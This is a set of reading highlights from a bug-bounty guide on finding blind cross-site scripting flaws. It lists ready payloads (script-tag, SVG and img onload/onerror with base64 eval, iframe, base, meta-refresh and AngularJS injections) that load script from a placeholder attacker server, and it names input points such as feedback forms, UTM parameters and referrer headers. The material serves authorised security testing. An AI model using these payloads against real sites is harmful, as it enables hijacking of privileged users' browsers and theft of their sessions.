---
author: novasecio
aliases:
  - "Hunting for Blind XSS Vulnerabilities: A Complete Guide"
tags:
  - readwise/articles
url: https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide
date: 2025-01-07
---
# Hunting for Blind XSS Vulnerabilities: A Complete Guide

![rw-book-cover](https://blog.intigriti.com/icon.svg)


Blind XSS vulnerabilities are quite different as the reflection happens on a component that's not accessible to the attacker (for example, an internal-only administrative panel, or a support dashboard accessible by the helpdesk employees only). Moreover, the execution is also dependent on a privileged user that has access to the vulnerable component.
> [View Highlight](https://read.readwise.io/read/01jh020meaj7ww73j0t064pf5k)


A common approach taken is by loading a JavaScript file from your end. For that, we'd need a dedicated server that is set up to listen and handle any incoming invocations. Luckily for us, there are already open-source projects and managed solutions (sometimes paid) that we can use.
 - [XSSHunter](https://github.com/mandatoryprogrammer/xsshunter-express) by [@IAmMandatory](https://x.com/IAmMandatory) is one of them. It's open-source and easy to set up in just 5 minutes.

> [View Highlight](https://read.readwise.io/read/01jh021eg91cws70m212mp8shr)



## Injecting an external script

 This is the most common approach taken. It also allows us to bypass any applicable character limitations and makes sure our code executes without any issues. This payload will work in multiple contexts.
 
```html
 '"><script src="{SERVER}/script.js"></script>
```
 
 ### Injecting an external script (bypass)
 
 In case your payload with the script tag is blocked, we can use a simple bypass with a simple SVG tag. The following payload also makes use of base64 encoding to help prevent execution errors with our payload due to incorrect URL encoding.
```html
'"><svg onload="eval(atob(this.id))">
```
 Here's the base64 decoded payload:
```html
 const x=document.createElement('script');x.src='{SERVER}/script.js';document.body.appendChild(x);
 ```
> [View Highlight](https://read.readwise.io/read/01jh0221k7bnx14ahvcsh56r3g)

## HTTP callback

 In some cases, limited HTML is accepted and all other tags are filtered. In that case, we can still try to check if the component is vulnerable to potential blind XSS by injecting an image tag.
```html
 '"><img src="{SERVER}/img.png">
 ```
 More advanced payloads
```html
 <!-- Image tag -->
 '"><img src="x" onerror="eval(atob(this.id))">
 <!-- Input tag with autofocus -->
 '"><input autofocus onfocus="eval(atob(this.id))">
 <!-- In case jQuery is loaded, we can make use of the getScript method -->
 '"><script>$.getScript("{SERVER}/script.js")</script>
 <!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
 javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))
 <!-- Render an iframe to validate your injection point and receive a callback -->
 '"><iframe src="{SERVER}"></iframe>
 <!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
 <base href="{SERVER}" />
 <!-- Make use of the meta-tag to initiate a redirect -->
 <meta http-equiv="refresh" content="0; url={SERVER}" />
 <!-- In case your target makes use of AngularJS -->
 {{constructor.constructor("import('{SERVER}/script.js')")()}}
 ```
 
 >[!tip]
 >Try to include a random string or keyword in your payload to track your injection points.

> [View Highlight](https://read.readwise.io/read/01jh022t45y7setqmjjx8dxf9z)



No target is the same but a key rule to follow is to test for blind XSS vulnerability in any type of web component or feature that processes user input and is likely to be processed by internal tooling or reviewed by a privileged user.

 Some examples include:
- Feedback forms (especially when the company does not rely on third-party vendors for this feature)
- Parameters processed by analytic engines (UTM parameters are always a good start)
- Request headers processed by analytics engines (referrer headers are almost always parsed)
- Blogs and help documentation
- Generic errors
- Invoices or receipts for orders

> [View Highlight](https://read.readwise.io/read/01jh024mzqfrzrav3m68ht5c2e)



